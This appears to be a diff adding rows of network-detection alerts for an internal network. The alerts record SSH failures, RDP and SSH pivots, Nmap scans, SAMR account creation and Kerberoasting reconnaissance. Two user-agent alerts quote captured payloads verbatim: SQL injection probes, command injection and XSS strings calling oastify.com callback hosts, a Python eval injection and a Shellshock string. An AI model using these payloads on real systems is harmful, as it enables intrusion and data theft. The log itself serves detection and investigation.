+  server: 142.250.186.67, 40.126.31.71, 162.159.134.233, 162.159.134.232, 162.159.138.232, 151.101.194.137, 10.0.9.11, 172.217.18.3, 162.159.129.233, 142.250.186.138;
+  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
+  not_before: , 2025-03-16T00:00:00Z, 2025-03-27T01:24:33Z;
+  server_asset_id: 1732, 364, 3600, 3606, 3603, 3607, 3705, 3596, 3598, 3601;
+  dst__port: ('',);
+  dns: ;
+  uuid: ebad8689-03f1-4304-bad2-a123e46234e8, 032e0d94-508b-491f-8f23-b8891f8d908c, 87205bba-1dac-44b6-8527-cf25e80132e7, bb44922e-532d-4e01-a027-6d96f44ba115, 46705af8-6c29-463b-bd17-e07ad43915b9, 56cff5fb-ac21-4b9a-b71a-c63ff2cfb7c1, bcad4b8b-c209-4015-8234-9c725b450cca, 2d9cee3f-63c5-4a73-a4c1-96739db7da98, fb1d46a9-307e-4d42-97a6-e5d6b3ddcd01, e1c29aa5-05da-4eca-9f87-9e7e256844d3;
+  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
+  client_asset_id: 1905, 1725, 50, 1916, 1921;
+  src__mac: ;
+  not_after: , 2025-09-16T23:59:59Z, 2026-03-27T01:24:33Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.9.30, 10.0.11.29, 10.0.4.30, 10.0.8.30, 10.0.2.29;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1905,1916,1732,1725,3603,364,3600,3606,3607,3705,3596,3598,3601,50,1921",,,"10.0.9.11,142.250.186.138,20.190.159.130,18.198.149.116,151.101.130.137,162.159.129.233,162.159.138.232,172.217.18.3,142.250.186.67,40.126.31.71","10.0.4.30,10.0.8.30,10.0.11.29,10.0.2.29,10.0.9.30",,"ebad8689-03f1-4304-bad2-a123e46234e8, 032e0d94-508b-491f-8f23-b8891f8d908c, 87205bba-1dac-44b6-8527-cf25e80132e7, bb44922e-532d-4e01-a027-6d96f44ba115, 46705af8-6c29-463b-bd17-e07ad43915b9, 56cff5fb-ac21-4b9a-b71a-c63ff2cfb7c1, bcad4b8b-c209-4015-8234-9c725b450cca, 2d9cee3f-63c5-4a73-a4c1-96739db7da98, fb1d46a9-307e-4d42-97a6-e5d6b3ddcd01, e1c29aa5-05da-4eca-9f87-9e7e256844d3",
+Low,30349,2025-03-28T08:37:03Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,8e1fff44-3b82-4d94-8a8e-79a907936b19,
+Low,31507,2025-03-28T08:54:47Z,Communication,Configuration,New Global User Agent,User Agent 'Python PSRP Client' was seen in the environment for the first time. Originating from asset 1921 (10.0.9.30) to 10.0.9.11 (10.0.9.11).,User Agent First Seen Globally,"1921,1732",,,10.0.9.30,10.0.9.11,,0018f5ce-2564-4391-bb5b-ce6d61217bb7,
+Low,31508,2025-03-28T08:55:09Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.11 (1732) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (devel), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1732",,,10.0.9.11,10.0.9.30,,,
+Low,31510,2025-03-28T08:45:25Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.11 (1732) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1732",,,10.0.9.11,10.0.9.30,,,
+Low,31511,2025-03-28T08:55:09Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.30 (1921) to host 10.0.9.11 (1732). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1732",,,10.0.9.30,10.0.9.11,,,
+Low,32266,2025-03-28T09:54:47Z,Communication,Indicator,Failed HTTP Logon,"Asset 1732 (10.0.9.11) returned an HTTP response code of 401 'Unauthorized' to asset 1921 (10.0.9.30), which represents a failed logon attempt via HTTP by asset 1921. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1732,1921",,,10.0.9.11,10.0.9.30,,d21c69f6-2204-4743-a27c-806ecb4d7aa1,
+Low,32285,2025-03-28T09:51:50Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,e8ea1b62-23d4-4289-8078-e701d3d7152c,
+Medium,32351,2025-03-28T10:07:14Z,Indicator,Indicator,Python PSRP Client User-Agent,Python PSRP Client User-Agent,Python User Agent Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+Low,32382,2025-03-28T10:12:21Z,Communication,Configuration,Detected 15 RDP New Comms between 2025-03-28T10:05:23.034Z and 2025-03-28T10:12:21.983Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.9.30, 10.0.3.29, 10.0.10.30, 10.0.9.44, 10.0.3.12, 10.0.10.11, 10.0.3.30;
+  dst_asset_id: 1896, 1709, 1727, 1801, 1919, 1735, 1921, 1791;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.9.30, 10.0.3.29, 10.0.10.30, 10.0.9.44, 10.0.3.12, 10.0.10.11, 10.0.10.29, 10.0.3.30;
+  rdp_selected_protocol: , hybrid, hybrid_ex, rds_tls;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1896, 1709, 1727, 1919, 1921, 1735, 1791;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , nmap, alice, devel;
+  src__ip: ;",RDP New Comms Pattern,"1896,1709,1791,1727,1919,1921,1735,1801",,,"10.0.3.30,10.0.3.29,10.0.3.12,10.0.9.44,10.0.10.30,10.0.9.30,10.0.10.11","10.0.3.30,10.0.3.29,10.0.3.12,10.0.9.44,10.0.10.30,10.0.9.30,10.0.10.11,10.0.10.29",,,
+Low,32385,2025-03-28T10:09:46Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,c4a9bc53-504f-4dea-a45c-1fefa3541fa3,
+Low,32394,2025-03-28T10:04:15Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,e170fd30-0490-4a02-a84b-e4a4e3a9cf23,
+Low,32395,2025-03-28T10:04:15Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,9608d2d8-4c0e-45a3-aae4-c85ccb52eea3,
+Low,32399,2025-03-28T10:00:36Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.45.,SSH Authentication Failure,"2896,1820",,,10.0.242.127,10.0.9.45,,28315053-ddf8-47be-bd91-eed29ba8ba2d,
+Low,32410,2025-03-28T08:49:31Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,6050649a-2aed-449b-a4eb-a56f4fab67c1,
+Low,32565,2025-03-28T10:03:48Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1732 (10.0.9.11) via RDP.,Interactive Session Pivots,"1732,2896",,,10.0.242.127,10.0.9.11,,,
+Low,32623,2025-03-28T10:18:42Z,Indicator,Threat Behavior,SMB2 IOCTL Request DCERPC SAMR CreateUser - possible persistence,SMB2 IOCTL Request DCERPC SAMR CreateUser - possible persistence,SMB Windows Account Create,"1729,1732",,,10.0.9.29,10.0.9.11,,Network Traffic,
+High,32634,2025-03-28T10:24:09Z,Indicator,Indicator,Nmap - SIP Request,Nmap - SIP Request,Nmap Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+High,32638,2025-03-28T10:24:08Z,Indicator,Indicator,Nmap - RDP Cookie,Nmap - RDP Cookie,Nmap Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+High,32639,2025-03-28T10:24:59Z,Indicator,Indicator,Nmap - HTTP URI Request from Nmap Scanner,Nmap - HTTP URI Request from Nmap Scanner,Nmap Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+Medium,32645,2025-03-28T10:24:57Z,Indicator,Threat Behavior,HTTP Request /etc/passwd,HTTP Request /etc/passwd,HTTP Hunting Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+Low,32654,2025-03-28T10:28:31Z,Indicator,Threat Behavior,SMB2 IOCTL Request DCERPC SAMR OpenGroup Domain Admins,SMB2 IOCTL Request DCERPC SAMR OpenGroup Domain Admins,Net.exe Command Signatures,"1729,1732",,,10.0.9.29,10.0.9.11,,Network Traffic,
+Low,32702,2025-03-28T10:26:16Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 1921 (10.0.9.30) connected via SSH to asset 1732 (10.0.9.11) to then pivot to asset 1729 (10.0.9.29) via RDP.,Interactive Session Pivots,"1729,1921",,,10.0.9.30,10.0.9.29,,,
+Low,32705,2025-03-28T10:16:08Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1854 (10.0.9.12) via TELNET.,Interactive Session Pivots,"2896,1854",,,10.0.242.127,10.0.9.12,,,
+Low,32706,2025-03-28T10:22:24Z,Communication,Configuration,RDP New Cookie,New RDP cookie a from host 10.0.9.29 (asset 1729) to host 10.0.9.30 (asset 1921).,RDP New Cookie,"1729,1921",,,10.0.9.29,10.0.9.30,,,
+Low,32707,2025-03-28T10:20:35Z,Communication,Configuration,RDP New Cookie,New RDP cookie admin from host 10.0.9.12 (asset 1854) to host 10.0.9.30 (asset 1921).,RDP New Cookie,"1921,1854",,,10.0.9.12,10.0.9.30,,,
+Medium,32709,2025-03-28T10:24:09Z,Communication,Threat Behavior,RDP Nonstandard Port,"An RDP negotiated connection was observed between Asset 1921 (10.0.9.30:39926) and Asset 1854 (10.0.9.12:445) using a non-standard port. RDP enables endpoints to negotiate certain configurations while establishing a session, including the specification of preferred / alternate ports. Attackers commonly use non-standard ports to evade detection and bypass security controls like network connection filtering.",RDP Nonstandard Port,"1921,1854",,,10.0.9.30,10.0.9.12,,98db5c4d-4326-47e3-b278-ccfad5d21775,
+Low,32710,2025-03-28T10:20:40Z,Communication,Configuration,Detected 14 NewX509Certificate between 2025-03-28T10:09:43.755Z and 2025-03-28T10:20:40.228Z,"Sample NewX509Certificate values include:
+  server: 104.83.120.20, 185.199.108.133, 20.86.201.138, 20.44.10.123, 104.126.37.186, 216.58.212.170, 51.11.192.50, 142.250.185.170, 104.126.37.137, 140.82.112.21;
+  subject: , C=US, ST=WA, L=Redmond, O=Microsoft Corporation, CN=arc.msn.com;
+  not_before: , 2025-03-09T16:45:25Z;
+  server_asset_id: 3809, 3807, 3579, 2820, 3800, 3803, 3805, 3782, 3602, 3804;
+  dst__port: ('',);
+  dns: ;
+  uuid: 65f8914d-1c82-4fe1-bd4a-1baa4dfbd581, 8cdee813-9716-447c-857a-58fb3305de97, 978eec14-53c6-4691-a366-f979a360b7eb, ce836910-abc8-4d8e-9196-3667b39ce3a0, 530c727a-afde-4efc-8932-c8368340e11e, 10b5dc2a-dd69-480b-8d6e-2b22329b43ea, 80eebac8-5eb3-438c-833e-d9704899b823, bb9c42cf-c11c-4955-a48f-05ad2a37a655, 98dcd21c-bfcb-43cd-b3b9-63115e279b9c, 6e35ebe0-0b64-47f5-98fc-c005a37c9717;
+  issuer: , C=US, O=Microsoft Corporation, CN=Microsoft Azure RSA TLS Issuing CA 03;
+  client_asset_id: 1921, 44, 1709, 1746;
+  src__mac: ;
+  not_after: , 2025-09-05T16:45:25Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.9.30, 10.0.1.29, 10.0.6.29, 10.0.3.29;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1921,3809,3807,3579,2820,3800,3803,3805,3782,3602,3804,44,1709,1746",,,"20.44.10.123,142.250.185.170,185.199.108.133,20.190.160.22,104.83.120.20,51.11.192.50,216.58.212.170,184.25.50.72,116.203.101.164,20.86.201.138","10.0.9.30,10.0.1.29,10.0.3.29,10.0.6.29",,"65f8914d-1c82-4fe1-bd4a-1baa4dfbd581, 8cdee813-9716-447c-857a-58fb3305de97, 978eec14-53c6-4691-a366-f979a360b7eb, ce836910-abc8-4d8e-9196-3667b39ce3a0, 530c727a-afde-4efc-8932-c8368340e11e, 10b5dc2a-dd69-480b-8d6e-2b22329b43ea, 80eebac8-5eb3-438c-833e-d9704899b823, bb9c42cf-c11c-4955-a48f-05ad2a37a655, 98dcd21c-bfcb-43cd-b3b9-63115e279b9c, 6e35ebe0-0b64-47f5-98fc-c005a37c9717",
+Low,32720,2025-03-28T10:28:49Z,Communication,Configuration,Detected 16 RDP New Comms between 2025-03-28T10:12:23.444Z and 2025-03-28T10:28:49.126Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.9.30, 10.0.9.44, 10.0.9.12, 10.0.9.11, 10.0.2.11, 10.0.9.29;
+  dst_asset_id: 1732, 1727, 154, 1729, 1854, 1921;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.9.30, 10.0.9.44, 10.0.9.12, 10.0.9.11, 10.0.9.29, 10.0.2.30;
+  rdp_selected_protocol: , hybrid, hybrid_ex;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1732, 48, 1727, 1729, 1854, 1921;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , admin, plumber, a, nmap, alice, devel;
+  src__ip: ;",RDP New Comms Pattern,"1729,1921,1854,48,154,1732,1727",,,"10.0.9.29,10.0.9.30,10.0.9.12,10.0.2.11,10.0.9.11,10.0.9.44","10.0.9.29,10.0.9.30,10.0.9.12,10.0.2.30,10.0.9.11,10.0.9.44",,,
+Low,32727,2025-03-28T10:28:34Z,Asset,Configuration,Detected 99 NewUserAgent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:28:34.138Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
+  src__mac: ;
+  src_ip: 10.0.5.29, 10.0.7.30, 10.0.3.29, 10.0.10.30, 10.0.4.30, 10.0.9.12, 10.0.9.29, 10.0.5.30, 10.0.12.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1905, 1704, 1709, 1910, 1936, 1919, 1729, 1854, 1914;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Microsoft BITS/7.8, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), Microsoft-CryptoAPI/10.0, '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--;
+  src__ip: ;",User Agent First Seen,"1729,1854,1709,1919,1914,1910,1704,1905,1936",,,,,"10.0.9.29,10.0.9.12,10.0.3.29,10.0.10.30,10.0.7.30,10.0.12.30,10.0.5.29,10.0.4.30,10.0.5.30","d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
+Low,32746,2025-03-28T08:59:43Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,d8502eac-9333-4031-9ebe-f09c0deaf335,
+Low,32771,2025-03-28T10:24:59Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1921 and Asset:1854,New SMB Communication Detection,"1921,1854",,,10.0.9.30,10.0.9.12,,663ecfd8-72cd-4498-9f81-f0944fb4abd7,
+Low,32772,2025-03-28T10:28:25Z,Communication,Configuration,New SMB Communication detected,"New SMB_FileInfo (version: ['SMB1', 'SMB2']) traffic between Asset:1729 and Asset:1854",New SMB Communication Detection,"1729,1854",,,10.0.9.29,10.0.9.12,,1fa3bbda-7dd2-4da5-afb4-cd4b3e1e15d8,
+Low,32775,2025-03-28T10:29:56Z,Indicator,Indicator,HTTP Request for .hta File,HTTP Request for .hta File,HTTP Request for File Extension,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+Low,32776,2025-03-28T10:30:12Z,Indicator,Threat Behavior,HTTP URI CLI Command netstat,HTTP URI CLI Command netstat,HTTP Hunting CLI Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+Low,32777,2025-03-28T10:29:56Z,Indicator,Threat Behavior,HTTP Request .bash_history,HTTP Request .bash_history,HTTP Hunting Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+Low,32783,2025-03-28T10:30:22Z,Indicator,Threat Behavior,HTTP URI CLI Command wget,HTTP URI CLI Command wget,HTTP Hunting CLI Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+Low,32784,2025-03-28T10:30:02Z,Indicator,Threat Behavior,HTTP URI CLI Command crontab,HTTP URI CLI Command crontab,HTTP Hunting CLI Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+Low,32799,2025-03-28T10:31:08Z,Indicator,Threat Behavior,LDAP Request ServicePrincipalName Accounts - Kerberoasting Possible,LDAP Request ServicePrincipalName Accounts - Kerberoasting Possible,LDAP Based Recon,"1921,1732",,,10.0.9.30,10.0.9.11,,Network Traffic,
+Low,32827,2025-03-28T10:40:50Z,Communication,Configuration,Detected 6 NewSMBTraffic between 2025-03-28T10:33:27.605Z and 2025-03-28T10:40:50.630Z,"Sample NewSMBTraffic values include:
+  dst__port: ('',);
+  dst_asset_id: 1721, 1868, 1919, 1854, 1697, 135;
+  uuid: cb825ada-bbcf-4219-ad75-057d7c55e487, acaf527d-4b97-43ad-b4ef-34fbc33e3e77, a6a8c16a-b366-42c3-8bd4-43c3050a4441, bbffa1db-60ab-4510-8b41-a5db113bc83e, 9920da0f-7331-4261-b8a4-db884e05fede, c5dd6e3e-2c81-43f1-87de-c043210a9bd5;
+  src__mac: ;
+  dst__mac: ;
+  log_type: SMB_FileInfo, SMB_TreeInfo;
+  protocol: ;
+  versions: , SMB2, SMB1;
+  src_asset_id: 48, 1910, 1801, 1729, 1933, 1704;
+  dst__ip: ;
+  src__port: ('',);
+  src__ip: ;",New SMB Communication Detection,"48,1910,1801,1729,1933,1704,1721,1868,1919,1854,1697,135",,,"10.0.2.11,10.0.12.30,10.0.10.29,10.0.9.29,10.0.11.30,10.0.5.29","10.0.11.12,10.0.12.12,10.0.10.30,10.0.9.12,10.0.5.12,10.0.2.43",,"cb825ada-bbcf-4219-ad75-057d7c55e487, acaf527d-4b97-43ad-b4ef-34fbc33e3e77, a6a8c16a-b366-42c3-8bd4-43c3050a4441, bbffa1db-60ab-4510-8b41-a5db113bc83e, 9920da0f-7331-4261-b8a4-db884e05fede, c5dd6e3e-2c81-43f1-87de-c043210a9bd5",
+Low,32831,2025-03-28T10:37:39Z,Communication,Configuration,Detected 21 NewX509Certificate between 2025-03-28T10:26:38.369Z and 2025-03-28T10:37:39.407Z,"Sample NewX509Certificate values include:
+  server: 23.3.89.120, 23.11.206.112, 23.11.206.104, 142.250.185.138, 184.25.50.200, 98.64.238.3, 40.126.31.2, 104.208.16.92, 23.32.238.99, 23.32.238.96;
+  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
+  not_before: , 2025-03-16T00:00:00Z, 2025-03-27T01:24:33Z;
+  server_asset_id: 3811, 1772, 3831, 3825, 3830, 1779, 3817, 3828, 3816, 3785;
+  dst__port: ('',);
+  dns: ;
+  uuid: 460dcfbb-9296-407b-91de-bebe9236da07, 4b8c0dd7-15de-45ea-8cfa-6434c4569602, a653a156-4bbb-4ee1-bfc8-1bb338f138d5, 9b145ab0-7c6b-4522-b651-8d84cf539d10, e95bb3a7-a71f-4baf-b184-2f2916c03438, 3574d92a-fd5d-4f49-8c1d-465a54400b9e, 22f19f9c-ac3e-430d-8548-a10aa1cc7ae7, 05e7b917-662a-4129-b2bd-853486070fc7, e2e2895f-2de6-43ce-86e1-32bde3b5a4dc, d76c2ed4-c426-4225-933f-552b43af9acb;
+  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
+  client_asset_id: 1905, 48, 1916, 1746, 1729, 1704, 1914;
+  src__mac: ;
+  not_after: , 2025-09-16T23:59:59Z, 2026-03-27T01:24:33Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.5.29, 10.0.6.29, 10.0.7.30, 10.0.4.30, 10.0.8.30, 10.0.2.11, 10.0.9.29;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1914,1772,48,1729,1704,1916,1905,3831,3830,3825,3828,3811,1779,3817,3816,3785,1746",,,"10.0.7.11,184.25.50.161,20.189.173.24,98.64.238.3,40.90.65.40,23.3.89.120,10.0.8.11,23.11.206.98,184.25.50.200,23.11.206.112","10.0.7.30,10.0.2.11,10.0.9.29,10.0.5.29,10.0.8.30,10.0.4.30,10.0.6.29",,"460dcfbb-9296-407b-91de-bebe9236da07, 4b8c0dd7-15de-45ea-8cfa-6434c4569602, a653a156-4bbb-4ee1-bfc8-1bb338f138d5, 9b145ab0-7c6b-4522-b651-8d84cf539d10, e95bb3a7-a71f-4baf-b184-2f2916c03438, 3574d92a-fd5d-4f49-8c1d-465a54400b9e, 22f19f9c-ac3e-430d-8548-a10aa1cc7ae7, 05e7b917-662a-4129-b2bd-853486070fc7, e2e2895f-2de6-43ce-86e1-32bde3b5a4dc, d76c2ed4-c426-4225-933f-552b43af9acb",
+Low,32832,2025-03-28T10:43:52Z,Asset,Configuration,Detected 7 NewUserAgent between 2025-03-28T10:30:03.270Z and 2025-03-28T10:43:52.442Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: ec08ee54-46df-4b8a-b4af-e1e146ac9e05, 03bf0cf0-4928-448b-ae06-dbaf45c3cce3, 042fda49-036e-4f2d-b4c1-2206a3e48d24, 14808401-9953-49e7-8577-a8b8807a307a, 000b2a7f-644a-4b24-9909-9b01c3dfb6d1, 4c014e11-1667-4d89-a788-0c563ecf438c, 0001445f-cd4d-4260-b410-c2a39529be73;
+  src__mac: ;
+  src_ip: 10.0.4.30, 10.0.9.30, 10.0.2.11, 10.0.11.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1921, 1905, 1933, 48;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Microsoft WinRM Client, Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1), Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36, Microsoft BITS/7.8, () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0, Python PSRP Client;
+  src__ip: ;",User Agent First Seen,"48,1933,1905,1921",,,,,"10.0.2.11,10.0.11.30,10.0.4.30,10.0.9.30","ec08ee54-46df-4b8a-b4af-e1e146ac9e05, 03bf0cf0-4928-448b-ae06-dbaf45c3cce3, 042fda49-036e-4f2d-b4c1-2206a3e48d24, 14808401-9953-49e7-8577-a8b8807a307a, 000b2a7f-644a-4b24-9909-9b01c3dfb6d1, 4c014e11-1667-4d89-a788-0c563ecf438c, 0001445f-cd4d-4260-b410-c2a39529be73",
+Low,32839,2025-03-28T10:34:35Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,fe69d132-db37-46b0-843d-9ba8711c20aa,
+Low,32918,2025-03-28T10:30:39Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1729 (10.0.9.29) via SSH.,Interactive Session Pivots,"2896,1729",,,10.0.242.127,10.0.9.29,,,
+Low,32980,2025-03-28T10:22:24Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.9.29 (1729) (Enterprise Management/Server) received RDP traffic from 10.0.9.30 (1921).,RDP to Enterprise Management Asset,"1921,1729",,,10.0.9.30,10.0.9.29,,fe567048-c820-4a24-b458-cd802909c5b4,
+Low,32981,2025-03-28T10:20:05Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.9.44 (1727) (Enterprise Management/Server) received RDP traffic from 10.0.9.30 (1921).,RDP to Enterprise Management Asset,"1921,1727",,,10.0.9.30,10.0.9.44,,75be801e-31ef-408c-bb43-d6d547926a8f,
+Low,32985,2025-03-28T10:24:08Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.9.12 (1854) (Enterprise Management/Server) received RDP traffic from 10.0.9.30 (1921).,RDP to Enterprise Management Asset,"1921,1854",,,10.0.9.30,10.0.9.12,,05a063ab-dea7-4194-b29a-1ba96418e160,
+Low,33206,2025-03-28T10:05:23Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.30 (1921) to host 10.0.9.44 (1727). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1727",,,10.0.9.30,10.0.9.44,,,
+Low,33207,2025-03-28T10:05:23Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.44 (1727) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (alice), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1727",,,10.0.9.44,10.0.9.30,,,
+Low,33232,2025-03-28T10:24:12Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.29 (1729) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (alice), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1729",,,10.0.9.29,10.0.9.30,,,
+Low,33234,2025-03-28T10:21:14Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.30 (1921) to host 10.0.9.11 (1732). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1732",,,10.0.9.30,10.0.9.11,,,
